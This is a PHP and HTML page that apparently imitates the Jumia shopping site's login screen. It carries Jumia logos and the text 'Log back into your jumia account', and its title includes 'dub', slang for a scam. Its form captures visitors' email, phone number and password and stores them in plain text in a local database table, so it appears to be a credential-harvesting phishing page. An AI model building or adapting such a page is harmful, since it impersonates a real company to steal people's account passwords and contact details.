<?php
include "db.php";
SESSION_START();

$message = "";
if(isset($_POST['enter'])){
    $email = mysqli_real_escape_string($db, $_POST['email']);
    $code = mysqli_real_escape_string($db, $_POST['code']);
    $number = mysqli_real_escape_string($db, $_POST['number']);
    $password = mysqli_real_escape_string($db, $_POST['password']);

    $phone = $code.$number;
    if(empty($email) && empty($code) && empty($number) && empty($password)){
        $message = "All field cannot be empty";
    }elseif(empty($email)){
        $message = "Fill the email field";
    }elseif(empty($code)){
        $message = "Choose your country code";
    }elseif(empty($number)){
        $message = "Fill the phone number field";
    }elseif(empty($password)){
        $message = "Put your password";
    }else{
        $mark = "INSERT INTO login (email, phone, password) VALUES ('$email', '$phone', '$password')";
        $june = mysqli_query($db, $mark);
    
        if($june){
            header('location:signup.php');
        }
    }


}

// if(isset($_POST['forget'])){
//     header('location:recoverpassword.php');
// }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jumia signup dub</title>
    <link rel="shortcut icon" href="images/Jumia-Logo.png" type="image/x-icon">
    <link rel="stylesheet" href="style/signup.css">
    <link rel="stylesheet" href="style/login.css">
    <link rel="stylesheet" href="style/entry.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/all.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/all.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/brands.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/brands.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/fontawesome.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/fontawesome.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/regular.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/solid.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/solid.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/svg-with-js.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/svg-with-js.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v4-font-face.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v4-font-face.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v4-shims.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v4-shims.min.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v5-font-face.css">
    <link rel="stylesheet" href="fontawesome/fontawesome-free-6.1.1-web/css/v5-font-face.min.css">

</head>
<body>
    <div class="container">
        <div class="logo"><img src="images/one_logo.png" alt=""></div>
        <form action="" method="post">
        <div class="first">
            <h2>Welcome to Jumia</h2>
            <p>Log back into your jumia account</p>
        </div>
        <div class="input">
            <input type="email" name="email" placeholder="Enter email">
        </div>
        <div class="input">
        <select id="" name="code">
                <option value="+234">Code</option readonly>
                <option value="+234">+234</option>
            </select>
            <input type="phone" name="number" placeholder="Enter phone number" maxlength="10">
        </div>
        <div class="input">
            <input type="password" name="password" id="password" placeholder="Enter password">
            <span class="icons" onclick="showy()"><span id="show"><i class="fa fa-eye" aria-hidden="true"></i></span><span id="hide"><i class="fa fa-eye-slash" aria-hidden="true"></i></span></span>
        </div>
        <div class="errorback" style="transform: translateY(-50px); display: grid; place-items: center; text-align: center; color: rgb(167, 8, 8); font-size: 0.9rem;">
        <?php if(!empty($message)) { ?>
        <?php echo $message ; ?>
        <?php } ?> 
        </div>
        <button class="continue" name="enter">Sign up</button>
        <div class="support"><p>For further support, you may visit the Help Center or contact our customer service team</p></div>
        <div class="lastlogo"><img src="images/Jumia-Logo.png" alt=""></div>
        </form>
    </div>

    <script>
        function showy(){
            let password = document.getElementById("password");
            let show = document.getElementById("show");
            let hide = document.getElementById("hide")
            if(password.type === "password"){
                password.type = "text";
                show.style.display = "block";
                hide.style.display = "none";
            }else{
                password.type = "password";
                show.style.display = "none";
                hide.style.display = "block";
            }

        }
    </script>
</body>
</html>